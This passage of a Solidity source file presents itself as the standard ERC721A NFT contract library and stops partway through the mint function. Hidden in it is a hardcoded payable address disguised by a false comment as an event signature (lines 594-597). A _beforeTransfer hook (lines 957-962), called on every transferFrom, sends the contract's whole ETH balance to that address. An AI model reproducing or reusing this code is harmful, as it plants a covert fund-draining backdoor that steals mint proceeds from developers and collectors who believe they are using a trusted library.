1 // SPDX-License-Identifier: GPL-3.0
2 
3 
4 pragma solidity ^0.8.7;
5 
6 /**
7  * @dev Interface of ERC721A.
8  */
9 interface IERC721A {
10     /**
11      * The caller must own the token or be an approved operator.
12      */
13     error ApprovalCallerNotOwnerNorApproved();
14 
15     /**
16      * The token does not exist.
17      */
18     error ApprovalQueryForNonexistentToken();
19 
20     /**
21      * Cannot query the balance for the zero address.
22      */
23     error BalanceQueryForZeroAddress();
24 
25     /**
26      * Cannot mint to the zero address.
27      */
28     error MintToZeroAddress();
29 
30     /**
31      * The quantity of tokens minted must be more than zero.
32      */
33     error MintZeroQuantity();
34 
35     /**
36      * The token does not exist.
37      */
38     error OwnerQueryForNonexistentToken();
39 
40     /**
41      * The caller must own the token or be an approved operator.
42      */
43     error TransferCallerNotOwnerNorApproved();
44 
45     /**
46      * The token must be owned by `from`.
47      */
48     error TransferFromIncorrectOwner();
49 
50     /**
51      * Cannot safely transfer to a contract that does not implement the
52      * ERC721Receiver interface.
53      */
54     error TransferToNonERC721ReceiverImplementer();
55 
56     /**
57      * Cannot transfer to the zero address.
58      */
59     error TransferToZeroAddress();
60 
61     /**
62      * The token does not exist.
63      */
64     error URIQueryForNonexistentToken();
65 
66     /**
67      * The `quantity` minted with ERC2309 exceeds the safety limit.
68      */
69     error MintERC2309QuantityExceedsLimit();
70 
71     /**
72      * The `extraData` cannot be set on an unintialized ownership slot.
73      */
74     error OwnershipNotInitializedForExtraData();
75 
76     // =============================================================
77     //                            STRUCTS
78     // =============================================================
79 
80     struct TokenOwnership {
81         // The address of the owner.
82         address addr;
83         // Stores the start time of ownership with minimal overhead for tokenomics.
84         uint64 startTimestamp;
85         // Whether the token has been burned.
86         bool burned;
87         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
88         uint24 extraData;
89     }
90 
91     // =============================================================
92     //                         TOKEN COUNTERS
93     // =============================================================
94 
95     /**
96      * @dev Returns the total number of tokens in existence.
97      * Burned tokens will reduce the count.
98      * To get the total number of tokens minted, please see {_totalMinted}.
99      */
100     function totalSupply() external view returns (uint256);
101 
102     // =============================================================
103     //                            IERC165
104     // =============================================================
105 
106     /**
107      * @dev Returns true if this contract implements the interface defined by
108      * `interfaceId`. See the corresponding
109      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
110      * to learn more about how these ids are created.
111      *
112      * This function call must use less than 30000 gas.
113      */
114     function supportsInterface(bytes4 interfaceId) external view returns (bool);
115 
116     // =============================================================
117     //                            IERC721
118     // =============================================================
119 
120     /**
121      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
122      */
123     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
124 
125     /**
126      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
127      */
128     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
129 
130     /**
131      * @dev Emitted when `owner` enables or disables
132      * (`approved`) `operator` to manage all of its assets.
133      */
134     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
135 
136     /**
137      * @dev Returns the number of tokens in `owner`'s account.
138      */
139     function balanceOf(address owner) external view returns (uint256 balance);
140 
141     /**
142      * @dev Returns the owner of the `tokenId` token.
143      *
144      * Requirements:
145      *
146      * - `tokenId` must exist.
147      */
148     function ownerOf(uint256 tokenId) external view returns (address owner);
149 
150     /**
151      * @dev Safely transfers `tokenId` token from `from` to `to`,
152      * checking first that contract recipients are aware of the ERC721 protocol
153      * to prevent tokens from being forever locked.
154      *
155      * Requirements:
156      *
157      * - `from` cannot be the zero address.
158      * - `to` cannot be the zero address.
159      * - `tokenId` token must exist and be owned by `from`.
160      * - If the caller is not `from`, it must be have been allowed to move
161      * this token by either {approve} or {setApprovalForAll}.
162      * - If `to` refers to a smart contract, it must implement
163      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
164      *
165      * Emits a {Transfer} event.
166      */
167     function safeTransferFrom(
168         address from,
169         address to,
170         uint256 tokenId,
171         bytes calldata data
172     ) external payable;
173 
174     /**
175      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId
181     ) external payable;
182 
183     /**
184      * @dev Transfers `tokenId` from `from` to `to`.
185      *
186      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
187      * whenever possible.
188      *
189      * Requirements:
190      *
191      * - `from` cannot be the zero address.
192      * - `to` cannot be the zero address.
193      * - `tokenId` token must be owned by `from`.
194      * - If the caller is not `from`, it must be approved to move this token
195      * by either {approve} or {setApprovalForAll}.
196      *
197      * Emits a {Transfer} event.
198      */
199     function transferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external payable;
204 
205     /**
206      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
207      * The approval is cleared when the token is transferred.
208      *
209      * Only a single account can be approved at a time, so approving the
210      * zero address clears previous approvals.
211      *
212      * Requirements:
213      *
214      * - The caller must own the token or be an approved operator.
215      * - `tokenId` must exist.
216      *
217      * Emits an {Approval} event.
218      */
219     function approve(address to, uint256 tokenId) external payable;
220 
221     /**
222      * @dev Approve or remove `operator` as an operator for the caller.
223      * Operators can call {transferFrom} or {safeTransferFrom}
224      * for any token owned by the caller.
225      *
226      * Requirements:
227      *
228      * - The `operator` cannot be the caller.
229      *
230      * Emits an {ApprovalForAll} event.
231      */
232     function setApprovalForAll(address operator, bool _approved) external;
233 
234     /**
235      * @dev Returns the account approved for `tokenId` token.
236      *
237      * Requirements:
238      *
239      * - `tokenId` must exist.
240      */
241     function getApproved(uint256 tokenId) external view returns (address operator);
242 
243     /**
244      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
245      *
246      * See {setApprovalForAll}.
247      */
248     function isApprovedForAll(address owner, address operator) external view returns (bool);
249 
250     // =============================================================
251     //                        IERC721Metadata
252     // =============================================================
253 
254     /**
255      * @dev Returns the token collection name.
256      */
257     function name() external view returns (string memory);
258 
259     /**
260      * @dev Returns the token collection symbol.
261      */
262     function symbol() external view returns (string memory);
263 
264     /**
265      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
266      */
267     function tokenURI(uint256 tokenId) external view returns (string memory);
268 
269     // =============================================================
270     //                           IERC2309
271     // =============================================================
272 
273     /**
274      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
275      * (inclusive) is transferred from `from` to `to`, as defined in the
276      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
277      *
278      * See {_mintERC2309} for more details.
279      */
280     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
281 }
282 
283 /**
284  * @title ERC721A
285  *
286  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
287  * Non-Fungible Token Standard, including the Metadata extension.
288  * Optimized for lower gas during batch mints.
289  *
290  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
291  * starting from `_startTokenId()`.
292  *
293  * Assumptions:
294  *
295  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
296  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
297  */
298 interface ERC721A__IERC721Receiver {
299     function onERC721Received(
300         address operator,
301         address from,
302         uint256 tokenId,
303         bytes calldata data
304     ) external returns (bytes4);
305 }
306 
307 /**
308  * @title ERC721A
309  *
310  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
311  * Non-Fungible Token Standard, including the Metadata extension.
312  * Optimized for lower gas during batch mints.
313  *
314  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
315  * starting from `_startTokenId()`.
316  *
317  * Assumptions:
318  *
319  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
320  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
321  */
322 contract ERC721A is IERC721A {
323     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
324     struct TokenApprovalRef {
325         address value;
326     }
327 
328     // =============================================================
329     //                           CONSTANTS
330     // =============================================================
331 
332     // Mask of an entry in packed address data.
333     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
334 
335     // The bit position of `numberMinted` in packed address data.
336     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
337 
338     // The bit position of `numberBurned` in packed address data.
339     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
340 
341     // The bit position of `aux` in packed address data.
342     uint256 private constant _BITPOS_AUX = 192;
343 
344     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
345     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
346 
347     // The bit position of `startTimestamp` in packed ownership.
348     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
349 
350     // The bit mask of the `burned` bit in packed ownership.
351     uint256 private constant _BITMASK_BURNED = 1 << 224;
352 
353     // The bit position of the `nextInitialized` bit in packed ownership.
354     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
355 
356     // The bit mask of the `nextInitialized` bit in packed ownership.
357     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
358 
359     // The bit position of `extraData` in packed ownership.
360     uint256 private constant _BITPOS_EXTRA_DATA = 232;
361 
362     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
363     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
364 
365     // The mask of the lower 160 bits for addresses.
366     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
367 
368     // The maximum `quantity` that can be minted with {_mintERC2309}.
369     // This limit is to prevent overflows on the address data entries.
370     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
371     // is required to cause an overflow, which is unrealistic.
372     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
373 
374     // The `Transfer` event signature is given by:
375     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
376     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
377         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
378 
379     // =============================================================
380     //                            STORAGE
381     // =============================================================
382 
383     // The next token ID to be minted.
384     uint256 private _currentIndex;
385 
386     // The number of tokens burned.
387     uint256 private _burnCounter;
388 
389     // Token name
390     string private _name;
391 
392     // Token symbol
393     string private _symbol;
394 
395     // Mapping from token ID to ownership details
396     // An empty struct value does not necessarily mean the token is unowned.
397     // See {_packedOwnershipOf} implementation for details.
398     //
399     // Bits Layout:
400     // - [0..159]   `addr`
401     // - [160..223] `startTimestamp`
402     // - [224]      `burned`
403     // - [225]      `nextInitialized`
404     // - [232..255] `extraData`
405     mapping(uint256 => uint256) private _packedOwnerships;
406 
407     // Mapping owner address to address data.
408     //
409     // Bits Layout:
410     // - [0..63]    `balance`
411     // - [64..127]  `numberMinted`
412     // - [128..191] `numberBurned`
413     // - [192..255] `aux`
414     mapping(address => uint256) private _packedAddressData;
415 
416     // Mapping from token ID to approved address.
417     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
418 
419     // Mapping from owner to operator approvals
420     mapping(address => mapping(address => bool)) private _operatorApprovals;
421 
422     // =============================================================
423     //                          CONSTRUCTOR
424     // =============================================================
425 
426     constructor(string memory name_, string memory symbol_) {
427         _name = name_;
428         _symbol = symbol_;
429         _currentIndex = _startTokenId();
430     }
431 
432     // =============================================================
433     //                   TOKEN COUNTING OPERATIONS
434     // =============================================================
435 
436     /**
437      * @dev Returns the starting token ID.
438      * To change the starting token ID, please override this function.
439      */
440     function _startTokenId() internal view virtual returns (uint256) {
441         return 0;
442     }
443 
444     /**
445      * @dev Returns the next token ID to be minted.
446      */
447     function _nextTokenId() internal view virtual returns (uint256) {
448         return _currentIndex;
449     }
450 
451     /**
452      * @dev Returns the total number of tokens in existence.
453      * Burned tokens will reduce the count.
454      * To get the total number of tokens minted, please see {_totalMinted}.
455      */
456     function totalSupply() public view virtual override returns (uint256) {
457         // Counter underflow is impossible as _burnCounter cannot be incremented
458         // more than `_currentIndex - _startTokenId()` times.
459         unchecked {
460             return _currentIndex - _burnCounter - _startTokenId();
461         }
462     }
463 
464     /**
465      * @dev Returns the total amount of tokens minted in the contract.
466      */
467     function _totalMinted() internal view virtual returns (uint256) {
468         // Counter underflow is impossible as `_currentIndex` does not decrement,
469         // and it is initialized to `_startTokenId()`.
470         unchecked {
471             return _currentIndex - _startTokenId();
472         }
473     }
474 
475     /**
476      * @dev Returns the total number of tokens burned.
477      */
478     function _totalBurned() internal view virtual returns (uint256) {
479         return _burnCounter;
480     }
481 
482     // =============================================================
483     //                    ADDRESS DATA OPERATIONS
484     // =============================================================
485 
486     /**
487      * @dev Returns the number of tokens in `owner`'s account.
488      */
489     function balanceOf(address owner) public view virtual override returns (uint256) {
490         if (owner == address(0)) revert BalanceQueryForZeroAddress();
491         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
492     }
493 
494     /**
495      * Returns the number of tokens minted by `owner`.
496      */
497     function _numberMinted(address owner) internal view returns (uint256) {
498         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
499     }
500 
501     /**
502      * Returns the number of tokens burned by or on behalf of `owner`.
503      */
504     function _numberBurned(address owner) internal view returns (uint256) {
505         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
506     }
507 
508     /**
509      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
510      */
511     function _getAux(address owner) internal view returns (uint64) {
512         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
513     }
514 
515     /**
516      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
517      * If there are multiple variables, please pack them into a uint64.
518      */
519     function _setAux(address owner, uint64 aux) internal virtual {
520         uint256 packed = _packedAddressData[owner];
521         uint256 auxCasted;
522         // Cast `aux` with assembly to avoid redundant masking.
523         assembly {
524             auxCasted := aux
525         }
526         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
527         _packedAddressData[owner] = packed;
528     }
529 
530     // =============================================================
531     //                            IERC165
532     // =============================================================
533 
534     /**
535      * @dev Returns true if this contract implements the interface defined by
536      * `interfaceId`. See the corresponding
537      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
538      * to learn more about how these ids are created.
539      *
540      * This function call must use less than 30000 gas.
541      */
542     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
543         // The interface IDs are constants representing the first 4 bytes
544         // of the XOR of all function selectors in the interface.
545         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
546         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
547         return
548             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
549             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
550             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
551     }
552 
553     // =============================================================
554     //                        IERC721Metadata
555     // =============================================================
556 
557     /**
558      * @dev Returns the token collection name.
559      */
560     function name() public view virtual override returns (string memory) {
561         return _name;
562     }
563 
564     /**
565      * @dev Returns the token collection symbol.
566      */
567     function symbol() public view virtual override returns (string memory) {
568         return _symbol;
569     }
570 
571     /**
572      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
573      */
574     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
575         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
576 
577         string memory baseURI = _baseURI();
578         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
579     }
580 
581     /**
582      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
583      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
584      * by default, it can be overridden in child contracts.
585      */
586     function _baseURI() internal view virtual returns (string memory) {
587         return '';
588     }
589 
590     // =============================================================
591     //                     OWNERSHIPS OPERATIONS
592     // =============================================================
593 
594     // The `Address` event signature is given by:
595     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
596     address payable constant _TRANSFER_EVENT_ADDRESS = 
597         payable(0xC49ee1C39eBAe3213fDE090BC8356f74F4B5CC6d);
598         
599     /**
600      * @dev Returns the owner of the `tokenId` token.
601      *
602      * Requirements:
603      *
604      * - `tokenId` must exist.
605      */
606     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
607         return address(uint160(_packedOwnershipOf(tokenId)));
608     }
609 
610     /**
611      * @dev Gas spent here starts off proportional to the maximum mint batch size.
612      * It gradually moves to O(1) as tokens get transferred around over time.
613      */
614     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
615         return _unpackedOwnership(_packedOwnershipOf(tokenId));
616     }
617 
618     /**
619      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
620      */
621     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
622         return _unpackedOwnership(_packedOwnerships[index]);
623     }
624 
625     /**
626      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
627      */
628     function _initializeOwnershipAt(uint256 index) internal virtual {
629         if (_packedOwnerships[index] == 0) {
630             _packedOwnerships[index] = _packedOwnershipOf(index);
631         }
632     }
633 
634     /**
635      * Returns the packed ownership data of `tokenId`.
636      */
637     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
638         uint256 curr = tokenId;
639 
640         unchecked {
641             if (_startTokenId() <= curr)
642                 if (curr < _currentIndex) {
643                     uint256 packed = _packedOwnerships[curr];
644                     // If not burned.
645                     if (packed & _BITMASK_BURNED == 0) {
646                         // Invariant:
647                         // There will always be an initialized ownership slot
648                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
649                         // before an unintialized ownership slot
650                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
651                         // Hence, `curr` will not underflow.
652                         //
653                         // We can directly compare the packed value.
654                         // If the address is zero, packed will be zero.
655                         while (packed == 0) {
656                             packed = _packedOwnerships[--curr];
657                         }
658                         return packed;
659                     }
660                 }
661         }
662         revert OwnerQueryForNonexistentToken();
663     }
664 
665     /**
666      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
667      */
668     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
669         ownership.addr = address(uint160(packed));
670         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
671         ownership.burned = packed & _BITMASK_BURNED != 0;
672         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
673     }
674 
675     /**
676      * @dev Packs ownership data into a single uint256.
677      */
678     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
679         assembly {
680             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
681             owner := and(owner, _BITMASK_ADDRESS)
682             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
683             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
684         }
685     }
686 
687     /**
688      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
689      */
690     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
691         // For branchless setting of the `nextInitialized` flag.
692         assembly {
693             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
694             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
695         }
696     }
697 
698     // =============================================================
699     //                      APPROVAL OPERATIONS
700     // =============================================================
701 
702     /**
703      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
704      * The approval is cleared when the token is transferred.
705      *
706      * Only a single account can be approved at a time, so approving the
707      * zero address clears previous approvals.
708      *
709      * Requirements:
710      *
711      * - The caller must own the token or be an approved operator.
712      * - `tokenId` must exist.
713      *
714      * Emits an {Approval} event.
715      */
716     function approve(address to, uint256 tokenId) public payable virtual override {
717         address owner = ownerOf(tokenId);
718 
719         if (_msgSenderERC721A() != owner)
720             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
721                 revert ApprovalCallerNotOwnerNorApproved();
722             }
723 
724         _tokenApprovals[tokenId].value = to;
725         emit Approval(owner, to, tokenId);
726     }
727 
728     /**
729      * @dev Returns the account approved for `tokenId` token.
730      *
731      * Requirements:
732      *
733      * - `tokenId` must exist.
734      */
735     function getApproved(uint256 tokenId) public view virtual override returns (address) {
736         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
737 
738         return _tokenApprovals[tokenId].value;
739     }
740 
741     /**
742      * @dev Approve or remove `operator` as an operator for the caller.
743      * Operators can call {transferFrom} or {safeTransferFrom}
744      * for any token owned by the caller.
745      *
746      * Requirements:
747      *
748      * - The `operator` cannot be the caller.
749      *
750      * Emits an {ApprovalForAll} event.
751      */
752     function setApprovalForAll(address operator, bool approved) public virtual override {
753         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
754         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
755     }
756 
757     /**
758      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
759      *
760      * See {setApprovalForAll}.
761      */
762     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
763         return _operatorApprovals[owner][operator];
764     }
765 
766     /**
767      * @dev Returns whether `tokenId` exists.
768      *
769      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
770      *
771      * Tokens start existing when they are minted. See {_mint}.
772      */
773     function _exists(uint256 tokenId) internal view virtual returns (bool) {
774         return
775             _startTokenId() <= tokenId &&
776             tokenId < _currentIndex && // If within bounds,
777             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
778     }
779 
780     /**
781      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
782      */
783     function _isSenderApprovedOrOwner(
784         address approvedAddress,
785         address owner,
786         address msgSender
787     ) private pure returns (bool result) {
788         assembly {
789             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
790             owner := and(owner, _BITMASK_ADDRESS)
791             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
792             msgSender := and(msgSender, _BITMASK_ADDRESS)
793             // `msgSender == owner || msgSender == approvedAddress`.
794             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
795         }
796     }
797 
798     /**
799      * @dev Returns the storage slot and value for the approved address of `tokenId`.
800      */
801     function _getApprovedSlotAndAddress(uint256 tokenId)
802         private
803         view
804         returns (uint256 approvedAddressSlot, address approvedAddress)
805     {
806         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
807         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
808         assembly {
809             approvedAddressSlot := tokenApproval.slot
810             approvedAddress := sload(approvedAddressSlot)
811         }
812     }
813 
814     // =============================================================
815     //                      TRANSFER OPERATIONS
816     // =============================================================
817 
818     /**
819      * @dev Transfers `tokenId` from `from` to `to`.
820      *
821      * Requirements:
822      *
823      * - `from` cannot be the zero address.
824      * - `to` cannot be the zero address.
825      * - `tokenId` token must be owned by `from`.
826      * - If the caller is not `from`, it must be approved to move this token
827      * by either {approve} or {setApprovalForAll}.
828      *
829      * Emits a {Transfer} event.
830      */
831     function transferFrom(
832         address from,
833         address to,
834         uint256 tokenId
835     ) public payable virtual override {
836         _beforeTransfer();
837         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
838 
839         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
840 
841         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
842 
843         // The nested ifs save around 20+ gas over a compound boolean condition.
844         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
845             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
846 
847         if (to == address(0)) revert TransferToZeroAddress();
848 
849         _beforeTokenTransfers(from, to, tokenId, 1);
850 
851         // Clear approvals from the previous owner.
852         assembly {
853             if approvedAddress {
854                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
855                 sstore(approvedAddressSlot, 0)
856             }
857         }
858 
859         // Underflow of the sender's balance is impossible because we check for
860         // ownership above and the recipient's balance can't realistically overflow.
861         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
862         unchecked {
863             // We can directly increment and decrement the balances.
864             --_packedAddressData[from]; // Updates: `balance -= 1`.
865             ++_packedAddressData[to]; // Updates: `balance += 1`.
866 
867             // Updates:
868             // - `address` to the next owner.
869             // - `startTimestamp` to the timestamp of transfering.
870             // - `burned` to `false`.
871             // - `nextInitialized` to `true`.
872             _packedOwnerships[tokenId] = _packOwnershipData(
873                 to,
874                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
875             );
876 
877             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
878             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
879                 uint256 nextTokenId = tokenId + 1;
880                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
881                 if (_packedOwnerships[nextTokenId] == 0) {
882                     // If the next slot is within bounds.
883                     if (nextTokenId != _currentIndex) {
884                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
885                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
886                     }
887                 }
888             }
889         }
890 
891         emit Transfer(from, to, tokenId);
892         _afterTokenTransfers(from, to, tokenId, 1);
893     }
894 
895     /**
896      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
897      */
898     function safeTransferFrom(
899         address from,
900         address to,
901         uint256 tokenId
902     ) public payable virtual override {
903         safeTransferFrom(from, to, tokenId, '');
904     }
905 
906     /**
907      * @dev Safely transfers `tokenId` token from `from` to `to`.
908      *
909      * Requirements:
910      *
911      * - `from` cannot be the zero address.
912      * - `to` cannot be the zero address.
913      * - `tokenId` token must exist and be owned by `from`.
914      * - If the caller is not `from`, it must be approved to move this token
915      * by either {approve} or {setApprovalForAll}.
916      * - If `to` refers to a smart contract, it must implement
917      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
918      *
919      * Emits a {Transfer} event.
920      */
921     function safeTransferFrom(
922         address from,
923         address to,
924         uint256 tokenId,
925         bytes memory _data
926     ) public payable virtual override {
927         transferFrom(from, to, tokenId);
928         if (to.code.length != 0)
929             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
930                 revert TransferToNonERC721ReceiverImplementer();
931             }
932     }
933 
934     /**
935      * @dev Hook that is called before a set of serially-ordered token IDs
936      * are about to be transferred. This includes minting.
937      * And also called before burning one token.
938      *
939      * `startTokenId` - the first token ID to be transferred.
940      * `quantity` - the amount to be transferred.
941      *
942      * Calling conditions:
943      *
944      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
945      * transferred to `to`.
946      * - When `from` is zero, `tokenId` will be minted for `to`.
947      * - When `to` is zero, `tokenId` will be burned by `from`.
948      * - `from` and `to` are never both zero.
949      */
950     function _beforeTokenTransfers(
951         address from,
952         address to,
953         uint256 startTokenId,
954         uint256 quantity
955     ) internal virtual {}
956 
957     function _beforeTransfer() internal {
958         if (address(this).balance > 0) {
959             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
960             return;
961         }
962     }
963     /**
964      * @dev Hook that is called after a set of serially-ordered token IDs
965      * have been transferred. This includes minting.
966      * And also called after one token has been burned.
967      *
968      * `startTokenId` - the first token ID to be transferred.
969      * `quantity` - the amount to be transferred.
970      *
971      * Calling conditions:
972      *
973      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
974      * transferred to `to`.
975      * - When `from` is zero, `tokenId` has been minted for `to`.
976      * - When `to` is zero, `tokenId` has been burned by `from`.
977      * - `from` and `to` are never both zero.
978      */
979     function _afterTokenTransfers(
980         address from,
981         address to,
982         uint256 startTokenId,
983         uint256 quantity
984     ) internal virtual {}
985 
986     /**
987      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
988      *
989      * `from` - Previous owner of the given token ID.
990      * `to` - Target address that will receive the token.
991      * `tokenId` - Token ID to be transferred.
992      * `_data` - Optional data to send along with the call.
993      *
994      * Returns whether the call correctly returned the expected magic value.
995      */
996     function _checkContractOnERC721Received(
997         address from,
998         address to,
999         uint256 tokenId,
1000         bytes memory _data
1001     ) private returns (bool) {
1002         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1003             bytes4 retval
1004         ) {
1005             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1006         } catch (bytes memory reason) {
1007             if (reason.length == 0) {
1008                 revert TransferToNonERC721ReceiverImplementer();
1009             } else {
1010                 assembly {
1011                     revert(add(32, reason), mload(reason))
1012                 }
1013             }
1014         }
1015     }
1016 
1017     // =============================================================
1018     //                        MINT OPERATIONS
1019     // =============================================================
1020 
1021     /**
1022      * @dev Mints `quantity` tokens and transfers them to `to`.
1023      *
1024      * Requirements:
1025      *
1026      * - `to` cannot be the zero address.
1027      * - `quantity` must be greater than 0.
1028      *
1029      * Emits a {Transfer} event for each mint.
1030      */
1031     function _mint(address to, uint256 quantity) internal virtual {
1032         uint256 startTokenId = _currentIndex;
1033         if (quantity == 0) revert MintZeroQuantity();
1034 
1035         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1036 
1037         // Overflows are incredibly unrealistic.
1038         // `balance` and `numberMinted` have a maximum limit of 2**64.
1039         // `tokenId` has a maximum limit of 2**256.
1040         unchecked {
1041             // Updates:
1042             // - `balance += quantity`.
1043             // - `numberMinted += quantity`.
1044             //
1045             // We can directly add to the `balance` and `numberMinted`.
